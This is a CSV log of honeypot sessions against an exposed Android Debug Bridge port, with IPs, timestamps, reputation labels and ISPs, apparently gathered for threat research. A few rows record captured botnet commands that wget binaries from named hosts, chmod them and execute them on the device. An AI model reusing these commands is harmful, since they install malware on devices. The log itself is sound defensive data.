session_id,Anon Src IP,src_port,Dst IP,dest_port,start_time,end_time,duration,sensor,commands,VT Labels,VT Reputation,Geo Location,ISP,Malicious_Flag
c6b3c10ca0fc,85.123.249.229,38012,192.168.32.2,5555,2025-03-16T02:55:45.862769Z,2025-03-16T03:00:46.025880Z,300.16,honeypot01,,"malicious, malware, phishing",-1,AU,"AS14061 DigitalOcean, LLC",0
493cf28b0d0e,85.123.249.229,50470,192.168.32.2,5555,2025-03-16T02:55:55.860793Z,2025-03-16T03:00:56.034006Z,300.17,honeypot01,,"malicious, malware, phishing",-1,AU,"AS14061 DigitalOcean, LLC",0
90a25582485f,85.123.249.229,33290,192.168.32.2,5555,2025-03-16T02:56:05.863209Z,2025-03-16T03:01:06.048506Z,300.19,honeypot01,,"malicious, malware, phishing",-1,AU,"AS14061 DigitalOcean, LLC",0
9e6ffd0f048f,11.54.0.155,42106,192.168.96.2,5555,2025-03-14T05:33:56.781892Z,2025-03-14T05:38:56.882005Z,300.1,honeypot01,,"malicious, phishing, malware",-5,NL,AS50219 Valence Technology Co.,0
4219f6ecc3a6,11.54.0.155,49654,192.168.96.2,5555,2025-03-14T05:49:23.597598Z,2025-03-14T05:54:23.716505Z,300.12,honeypot01,,"malicious, phishing, malware",-5,NL,AS50219 Valence Technology Co.,0
e0aa3d4bba7b,234.134.63.95,49854,192.168.96.2,5555,2025-03-14T08:23:11.003551Z,2025-03-14T08:28:11.195659Z,300.19,honeypot01,,"malicious, malware",-1,US,AS8075 Microsoft Corporation,0
b6451ad6902c,221.42.177.15,49358,192.168.96.2,5555,2025-03-14T09:49:59.455962Z,2025-03-14T09:54:59.653788Z,300.2,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
e3aef3baf1d0,208.32.226.195,50598,192.168.96.2,5555,2025-03-14T12:41:39.653636Z,2025-03-14T12:46:39.794960Z,300.14,honeypot01,,malware,0,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
c0cc14506341,208.32.226.195,50606,192.168.96.2,5555,2025-03-14T12:41:43.686749Z,2025-03-14T12:46:43.800606Z,300.11,honeypot01,,malware,0,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
26302e97f277,208.32.226.195,59324,192.168.96.2,5555,2025-03-14T12:41:45.657068Z,2025-03-14T12:46:45.803215Z,300.15,honeypot01,,malware,0,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
c605c278c772,208.32.226.195,59338,192.168.96.2,5555,2025-03-14T12:41:48.644761Z,2025-03-14T12:46:48.843510Z,300.2,honeypot01,,malware,0,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
3d4d4ede6e3d,132.202.251.22,46974,192.168.96.2,5555,2025-03-14T16:13:05.587061Z,2025-03-14T16:18:05.796530Z,300.21,honeypot01,,"malicious, malware, phishing",-5,US,AS6939 Hurricane Electric LLC,0
85e7b432a09d,211.129.60.192,47634,192.168.96.2,5555,2025-03-14T19:30:08.613672Z,2025-03-14T19:35:08.806698Z,300.19,honeypot01,,"phishing, malicious, malware",-1,NL,AS214295 SKYNET NETWORK LTD,0
4fde1856d5be,211.129.60.192,53160,192.168.96.2,5555,2025-03-14T19:30:18.616318Z,2025-03-14T19:35:18.720777Z,300.1,honeypot01,,"phishing, malicious, malware",-1,NL,AS214295 SKYNET NETWORK LTD,0
10b956b30090,83.52.252.21,58594,192.168.96.2,5555,2025-03-14T19:38:15.118505Z,2025-03-14T19:43:15.136453Z,300.02,honeypot01,,malicious,0,SE,AS63949 Akamai Connected Cloud,0
eaf56394a212,96.117.84.18,15338,192.168.96.2,5555,2025-03-14T20:00:23.065772Z,2025-03-14T20:05:23.216512Z,300.15,honeypot01,,"malicious, malware",0,SG,AS136907 HUAWEI CLOUDS,0
cec99fc7276d,96.117.84.18,15558,192.168.96.2,5555,2025-03-14T20:00:23.091444Z,2025-03-14T20:05:23.277247Z,300.19,honeypot01,,"malicious, malware",0,SG,AS136907 HUAWEI CLOUDS,0
0ade77f63d36,6.251.21.161,63734,192.168.96.2,5555,2025-03-14T23:30:44.354857Z,2025-03-14T23:35:44.372505Z,300.02,honeypot01,,"malicious, malware, phishing",-55,TW,AS396982 Google LLC,1
5af594430f63,6.251.21.161,65286,192.168.96.2,5555,2025-03-14T23:30:54.355957Z,2025-03-14T23:35:54.384673Z,300.03,honeypot01,,"malicious, malware, phishing",-55,TW,AS396982 Google LLC,1
cdb3223644b0,132.202.251.22,25395,192.168.16.2,5555,2025-03-13T06:47:48.253308Z,2025-03-13T06:52:48.367313Z,300.11,honeypot01,,"malicious, malware, phishing",-5,US,AS6939 Hurricane Electric LLC,0
47eeb2cc40ed,76.69.240.77,40766,192.168.16.2,5555,2025-03-13T13:51:15.547123Z,2025-03-13T13:56:15.755277Z,300.21,honeypot01,,"malicious, malware",0,DE,,0
1c39d8264920,169.102.75.67,42404,192.168.16.2,5555,2025-03-13T20:18:46.091716Z,2025-03-13T20:23:46.264949Z,300.17,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
672be3959ee2,169.102.75.67,44984,192.168.16.2,5555,2025-03-13T20:18:54.193235Z,2025-03-13T20:23:54.382152Z,300.19,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
85f6c4aacaf8,169.102.75.67,46992,192.168.16.2,5555,2025-03-13T20:19:03.306715Z,2025-03-13T20:24:03.478311Z,300.17,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
5fc473e65db3,169.102.75.67,48710,192.168.16.2,5555,2025-03-13T20:19:12.438833Z,2025-03-13T20:24:12.625781Z,300.19,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
17a006e0be9f,169.102.75.67,50578,192.168.16.2,5555,2025-03-13T20:19:21.576878Z,2025-03-13T20:24:21.761517Z,300.18,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
a65ad177e6e8,169.102.75.67,52418,192.168.16.2,5555,2025-03-13T20:19:30.719773Z,2025-03-13T20:24:30.917452Z,300.2,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
6e341a7bcf33,169.102.75.67,54398,192.168.16.2,5555,2025-03-13T20:19:39.864716Z,2025-03-13T20:24:40.056673Z,300.19,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
06246f8f8dfd,169.102.75.67,56130,192.168.16.2,5555,2025-03-13T20:19:48.977444Z,2025-03-13T20:24:49.164607Z,300.19,honeypot01,,"malicious, phishing, malware",0,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
7e52c84786a3,30.227.231.27,54276,192.168.16.2,5555,2025-03-14T00:39:07.083930Z,2025-03-14T00:44:07.236119Z,300.15,honeypot01,,,0,VN,AS45899 VNPT Corp,0
8adc6fa3b488,30.227.231.27,54310,192.168.16.2,5555,2025-03-14T00:39:10.143865Z,2025-03-14T00:44:10.280446Z,300.14,honeypot01,,,0,VN,AS45899 VNPT Corp,0
51579fb8cb23,30.227.231.27,54331,192.168.16.2,5555,2025-03-14T00:39:12.977174Z,2025-03-14T00:44:13.158675Z,300.18,honeypot01,,,0,VN,AS45899 VNPT Corp,0
128ee29c43c3,30.227.231.27,54365,192.168.16.2,5555,2025-03-14T00:39:16.058709Z,2025-03-14T00:44:16.222311Z,300.16,honeypot01,,,0,VN,AS45899 VNPT Corp,0
e2fe474a7f11,30.227.231.27,54399,192.168.16.2,5555,2025-03-14T00:39:19.135841Z,2025-03-14T00:44:19.215117Z,300.08,honeypot01,,,0,VN,AS45899 VNPT Corp,0
9886b536f7fd,30.227.231.27,54435,192.168.16.2,5555,2025-03-14T00:39:21.719564Z,2025-03-14T00:39:21.720869Z,0.0,honeypot01,,,0,VN,AS45899 VNPT Corp,0
2119ae8d3602,30.227.231.27,54440,192.168.16.2,5555,2025-03-14T00:39:22.262849Z,2025-03-14T00:44:22.287528Z,300.03,honeypot01,,,0,VN,AS45899 VNPT Corp,0
ca43af8d22ce,30.227.231.27,54459,192.168.16.2,5555,2025-03-14T00:39:24.796741Z,2025-03-14T00:44:24.808119Z,300.01,honeypot01,,,0,VN,AS45899 VNPT Corp,0
8aeab07e0a70,30.227.231.27,54479,192.168.16.2,5555,2025-03-14T00:39:28.112263Z,2025-03-14T00:44:28.215184Z,300.1,honeypot01,,,0,VN,AS45899 VNPT Corp,0
9a362ec14eec,121.187.1.249,34720,172.23.0.2,5555,2025-03-12T07:15:40.092418Z,2025-03-12T07:20:40.165516Z,300.07,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
3a532d1a8092,121.187.1.249,39478,172.23.0.2,5555,2025-03-12T07:15:50.473411Z,2025-03-12T07:20:50.611510Z,300.14,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
dc44205fe27d,121.187.1.249,60102,172.23.0.2,5555,2025-03-12T07:16:00.536128Z,2025-03-12T07:21:00.541541Z,300.01,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
5d4f22d8372c,121.187.1.249,49326,172.23.0.2,5555,2025-03-12T07:16:10.536094Z,2025-03-12T07:21:10.538264Z,300.0,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
4cac9e92a821,121.187.1.249,47690,172.23.0.2,5555,2025-03-12T07:16:20.542301Z,2025-03-12T07:21:20.546287Z,300.0,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
946f7912c3d4,121.187.1.249,37904,172.23.0.2,5555,2025-03-12T07:16:30.544860Z,2025-03-12T07:21:30.550542Z,300.01,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
a0ae814c5b17,95.39.82.43,36512,172.23.0.2,5555,2025-03-12T10:22:56.808525Z,2025-03-12T10:27:56.823143Z,300.01,honeypot01,,"malicious, malware, phishing",-4,GB,"AS14061 DigitalOcean, LLC",0
d01b6d7a7652,95.39.82.43,48032,172.23.0.2,5555,2025-03-12T10:23:06.924496Z,2025-03-12T10:28:07.025701Z,300.1,honeypot01,,"malicious, malware, phishing",-4,GB,"AS14061 DigitalOcean, LLC",0
1a888b79398f,95.39.82.43,33358,172.23.0.2,5555,2025-03-12T10:23:16.925722Z,2025-03-12T10:28:17.030415Z,300.1,honeypot01,,"malicious, malware, phishing",-4,GB,"AS14061 DigitalOcean, LLC",0
425db08c8c3d,95.39.82.43,42882,172.23.0.2,5555,2025-03-12T10:23:26.931375Z,2025-03-12T10:28:27.032061Z,300.1,honeypot01,,"malicious, malware, phishing",-4,GB,"AS14061 DigitalOcean, LLC",0
a1130482422d,95.39.82.43,51676,172.23.0.2,5555,2025-03-12T10:23:36.929577Z,2025-03-12T10:28:36.935218Z,300.01,honeypot01,,"malicious, malware, phishing",-4,GB,"AS14061 DigitalOcean, LLC",0
eb28372fbaa6,95.39.82.43,36938,172.23.0.2,5555,2025-03-12T10:23:46.931220Z,2025-03-12T10:28:47.029689Z,300.1,honeypot01,,"malicious, malware, phishing",-4,GB,"AS14061 DigitalOcean, LLC",0
6fe1f0a24bd3,92.220.105.112,56500,172.23.0.2,5555,2025-03-12T13:38:45.089611Z,2025-03-12T13:43:45.171367Z,300.08,honeypot01,,"malicious, malware, phishing",-4,DE,"AS14061 DigitalOcean, LLC",0
439e2a5021eb,92.220.105.112,38148,172.23.0.2,5555,2025-03-12T13:38:55.093054Z,2025-03-12T13:43:55.184979Z,300.09,honeypot01,,"malicious, malware, phishing",-4,DE,"AS14061 DigitalOcean, LLC",0
76c37d7f4b8d,92.220.105.112,46176,172.23.0.2,5555,2025-03-12T13:39:05.091864Z,2025-03-12T13:44:05.178681Z,300.09,honeypot01,,"malicious, malware, phishing",-4,DE,"AS14061 DigitalOcean, LLC",0
3743049b595e,92.220.105.112,56104,172.23.0.2,5555,2025-03-12T13:39:15.090967Z,2025-03-12T13:44:15.179501Z,300.09,honeypot01,,"malicious, malware, phishing",-4,DE,"AS14061 DigitalOcean, LLC",0
535784a68b67,92.220.105.112,55774,172.23.0.2,5555,2025-03-12T13:39:25.096892Z,2025-03-12T13:44:25.187034Z,300.09,honeypot01,,"malicious, malware, phishing",-4,DE,"AS14061 DigitalOcean, LLC",0
f9b319125184,92.220.105.112,33376,172.23.0.2,5555,2025-03-12T13:39:35.095540Z,2025-03-12T13:44:35.186292Z,300.09,honeypot01,,"malicious, malware, phishing",-4,DE,"AS14061 DigitalOcean, LLC",0
0ab9a0307701,93.111.10.167,43336,172.23.0.2,5555,2025-03-12T18:47:55.015876Z,2025-03-12T18:52:55.072156Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
aeb24b07d393,93.111.10.167,43344,172.23.0.2,5555,2025-03-12T18:47:56.581258Z,2025-03-12T18:52:56.619653Z,300.04,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
532508ddf099,93.111.10.167,43346,172.23.0.2,5555,2025-03-12T18:47:58.146521Z,2025-03-12T18:52:58.202318Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
9ad3308251b8,93.111.10.167,43354,172.23.0.2,5555,2025-03-12T18:47:59.710114Z,2025-03-12T18:52:59.761966Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
dceaf7f6b4e3,93.111.10.167,41382,172.23.0.2,5555,2025-03-12T18:48:01.278312Z,2025-03-12T18:53:01.325205Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
3fd7cbea02af,93.111.10.167,41388,172.23.0.2,5555,2025-03-12T18:48:02.838331Z,2025-03-12T18:53:02.884523Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
0a21d8574b89,93.111.10.167,41396,172.23.0.2,5555,2025-03-12T18:48:04.404858Z,2025-03-12T18:53:04.459557Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
f608903cbf6b,93.111.10.167,41398,172.23.0.2,5555,2025-03-12T18:48:05.971291Z,2025-03-12T18:53:06.010438Z,300.04,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
2beb42bc48af,93.111.10.167,41404,172.23.0.2,5555,2025-03-12T18:48:07.537426Z,2025-03-12T18:48:07.538116Z,0.0,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
6dc6f9ee9e3f,93.111.10.167,41410,172.23.0.2,5555,2025-03-12T18:48:07.667644Z,2025-03-12T18:53:07.707855Z,300.04,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
cb9b048fc88e,93.111.10.167,41414,172.23.0.2,5555,2025-03-12T18:48:09.228604Z,2025-03-12T18:53:09.278850Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
a0ba9c84e91f,93.111.10.167,37102,172.23.0.2,5555,2025-03-12T18:48:10.792382Z,2025-03-12T18:53:10.838471Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
ed21003ec932,93.111.10.167,37114,172.23.0.2,5555,2025-03-12T18:48:12.360881Z,2025-03-12T18:53:12.412403Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
8815a4e51e8c,93.111.10.167,37118,172.23.0.2,5555,2025-03-12T18:48:13.926950Z,2025-03-12T18:53:13.983916Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
d16c832ed54f,93.111.10.167,37122,172.23.0.2,5555,2025-03-12T18:48:15.492716Z,2025-03-12T18:53:15.534215Z,300.04,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
ea0c988f280b,93.111.10.167,37124,172.23.0.2,5555,2025-03-12T18:48:17.057365Z,2025-03-12T18:53:17.109413Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
5c6261e53698,93.111.10.167,37126,172.23.0.2,5555,2025-03-12T18:48:18.623030Z,2025-03-12T18:53:18.675058Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
b8f7d705596d,93.111.10.167,37140,172.23.0.2,5555,2025-03-12T18:48:20.188442Z,2025-03-12T18:53:20.249055Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
2632fba7d911,93.111.10.167,50798,172.23.0.2,5555,2025-03-12T18:48:21.769450Z,2025-03-12T18:48:21.774815Z,0.01,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
3ef9fa131712,93.111.10.167,50810,172.23.0.2,5555,2025-03-12T18:48:21.909115Z,2025-03-12T18:53:22.039672Z,300.13,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
80f744b22ea5,93.111.10.167,50826,172.23.0.2,5555,2025-03-12T18:48:23.623647Z,2025-03-12T18:53:23.680788Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
4859614eaeb1,93.111.10.167,50836,172.23.0.2,5555,2025-03-12T18:48:25.203818Z,2025-03-12T18:53:25.302482Z,300.1,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
d4670101a902,93.111.10.167,50840,172.23.0.2,5555,2025-03-12T18:48:27.252788Z,,,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
0db54e9f9cc5,93.111.10.167,50856,172.23.0.2,5555,2025-03-12T18:48:29.123122Z,2025-03-12T18:53:29.173051Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
2f81bba8ead0,93.111.10.167,50858,172.23.0.2,5555,2025-03-12T18:48:30.693192Z,2025-03-12T18:53:30.878799Z,300.19,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
781f84011309,93.111.10.167,50866,172.23.0.2,5555,2025-03-12T18:48:32.395379Z,2025-03-12T18:53:32.469768Z,300.07,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
01c48a5cc0c3,93.111.10.167,50868,172.23.0.2,5555,2025-03-12T18:48:33.989964Z,2025-03-12T18:53:33.994534Z,300.0,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
b6a0752fa5a6,93.111.10.167,50876,172.23.0.2,5555,2025-03-12T18:48:35.903411Z,2025-03-12T18:53:35.926320Z,300.02,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
314d85164792,93.111.10.167,50884,172.23.0.2,5555,2025-03-12T18:48:38.134611Z,2025-03-12T18:53:38.326893Z,300.19,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
152a3449bf95,93.111.10.167,50886,172.23.0.2,5555,2025-03-12T18:48:40.183373Z,2025-03-12T18:53:40.364500Z,300.18,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
2592ace81a82,93.111.10.167,51068,172.23.0.2,5555,2025-03-12T18:48:42.084155Z,2025-03-12T18:53:42.147537Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
907c914653e2,93.111.10.167,51084,172.23.0.2,5555,2025-03-12T18:48:43.889552Z,2025-03-12T18:53:43.993413Z,300.1,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
75e048f0abc4,93.111.10.167,51096,172.23.0.2,5555,2025-03-12T18:48:45.921742Z,2025-03-12T18:53:46.076999Z,300.16,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
bec06c6db3cc,93.111.10.167,51098,172.23.0.2,5555,2025-03-12T18:48:47.781832Z,2025-03-12T18:53:47.843161Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
cb7a528cf7fc,93.111.10.167,51104,172.23.0.2,5555,2025-03-12T18:48:50.576396Z,2025-03-12T18:53:50.866493Z,300.29,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
a942414b14fd,93.111.10.167,54542,172.23.0.2,5555,2025-03-12T18:48:52.386790Z,2025-03-12T18:53:52.484677Z,300.1,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
79915c2fe0d7,93.111.10.167,54546,172.23.0.2,5555,2025-03-12T18:48:55.023969Z,2025-03-12T18:53:55.071957Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
a3affd1f21f5,93.111.10.167,54552,172.23.0.2,5555,2025-03-12T18:48:56.594449Z,2025-03-12T18:53:56.654185Z,300.06,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
f2695c86e766,93.111.10.167,54564,172.23.0.2,5555,2025-03-12T18:48:58.158249Z,2025-03-12T18:53:58.210140Z,300.05,honeypot01,,,0,US,"AS14061 DigitalOcean, LLC",0
3b0f0494cd3d,18.18.97.65,38864,172.23.0.2,5555,2025-03-12T20:17:54.252309Z,2025-03-12T20:17:54.570570Z,0.32,honeypot01,,"malware, phishing, malicious",0,NL,AS214943 Railnet LLC,0
1a6783c29589,1.185.211.135,15788,172.23.0.2,5555,2025-03-12T20:47:04.777778Z,2025-03-12T20:52:04.971358Z,300.19,honeypot01,,"malicious, malware",0,DE,AS208843 Alpha Strike Labs GmbH,0
1b649445bea3,18.18.97.248,48812,192.168.112.2,5555,2025-03-11T03:49:09.606107Z,2025-03-11T03:54:09.722046Z,300.12,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
1bba1c464ebb,5.59.92.13,44026,192.168.112.2,5555,2025-03-11T04:16:15.577788Z,2025-03-11T04:17:01.061758Z,45.48,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, phishing, malware",0,NL,AS401120 cheapy.host LLC,0
94283afcc684,76.69.240.77,44126,192.168.112.2,5555,2025-03-11T06:21:59.105093Z,2025-03-11T06:26:59.308467Z,300.2,honeypot01,,"malicious, malware",0,DE,,0
9bcb09c36464,124.211.11.175,53792,192.168.112.2,5555,2025-03-11T06:30:05.224870Z,2025-03-11T06:30:51.082645Z,45.86,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
3a20777aa6e9,83.92.28.57,47238,192.168.112.2,5555,2025-03-11T07:20:58.374256Z,2025-03-11T07:25:58.401880Z,300.03,honeypot01,,"malicious, malware",0,US,AS8075 Microsoft Corporation,0
6593195fbef3,124.211.11.175,40030,192.168.112.2,5555,2025-03-11T07:30:49.598908Z,2025-03-11T07:31:35.567073Z,45.97,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
a9683fd899d7,213.227.119.148,27946,192.168.112.2,5555,2025-03-11T13:12:45.726767Z,2025-03-11T13:17:45.782010Z,300.06,honeypot01,,malware,0,CN,AS4134 CHINANET-BACKBONE,0
ddaf199cdfd4,167.202.99.66,33644,192.168.112.2,5555,2025-03-11T13:12:59.773290Z,2025-03-11T13:17:59.987724Z,300.21,honeypot01,,,0,CN,AS4134 CHINANET-BACKBONE,0
0494dafd2658,132.202.251.125,29053,192.168.112.2,5555,2025-03-11T14:27:16.770026Z,2025-03-11T14:32:16.827496Z,300.06,honeypot01,,"malicious, malware, phishing",-3,US,AS6939 Hurricane Electric LLC,0
b0e84558451c,132.202.251.114,4841,192.168.112.2,5555,2025-03-11T14:28:00.739832Z,2025-03-11T14:33:00.774110Z,300.03,honeypot01,,"malicious, phishing, malware",-2,US,AS6939 Hurricane Electric LLC,0
23221b6e3c18,132.202.251.107,13433,192.168.112.2,5555,2025-03-11T14:28:00.749905Z,2025-03-11T14:33:00.773481Z,300.02,honeypot01,,"malicious, phishing, malware",-56,US,AS6939 Hurricane Electric LLC,1
06da1049579b,6.251.21.124,59078,192.168.112.2,5555,2025-03-11T18:14:28.751035Z,2025-03-11T18:19:28.788064Z,300.04,honeypot01,,"malicious, malware, phishing",-3,BE,AS396982 Google LLC,0
bb75d9276cb7,6.251.21.124,61264,192.168.112.2,5555,2025-03-11T18:14:38.752421Z,2025-03-11T18:19:38.893455Z,300.14,honeypot01,,"malicious, malware, phishing",-3,BE,AS396982 Google LLC,0
0e2794d023d3,76.69.240.77,48984,192.168.112.2,5555,2025-03-11T19:10:08.508074Z,2025-03-11T19:15:08.667978Z,300.16,honeypot01,,"malicious, malware",0,DE,,0
830bef123a8e,18.18.97.65,44924,192.168.112.2,5555,2025-03-12T00:16:28.671015Z,2025-03-12T00:21:28.882149Z,300.21,honeypot01,,"malware, phishing, malicious",0,NL,AS214943 Railnet LLC,0
8971ad326f1a,211.179.166.185,18660,172.26.0.2,5555,2025-03-10T05:41:12.441314Z,2025-03-10T05:46:12.525916Z,300.08,honeypot01,,"malicious, malware",0,BR,AS269051 UNIVERSO FIBER COMUNICACAO MULTIMIDIA,0
a385925675fd,124.211.11.175,38214,172.26.0.2,5555,2025-03-10T05:49:40.861589Z,2025-03-10T05:50:26.069167Z,45.21,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
e3d5bf953550,124.211.11.175,58798,172.26.0.2,5555,2025-03-10T06:27:00.201999Z,2025-03-10T06:27:46.060997Z,45.86,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
b2ee29482791,152.60.107.163,43853,172.26.0.2,5555,2025-03-10T07:02:27.770371Z,2025-03-10T07:07:27.842577Z,300.07,honeypot01,,"malicious, malware",0,FR,AS213412 ONYPHE SAS,0
f9317417f8b7,152.60.107.251,46197,172.26.0.2,5555,2025-03-10T07:02:27.971625Z,2025-03-10T07:07:28.177502Z,300.21,honeypot01,,"malicious, malware",0,FR,AS213412 ONYPHE SAS,0
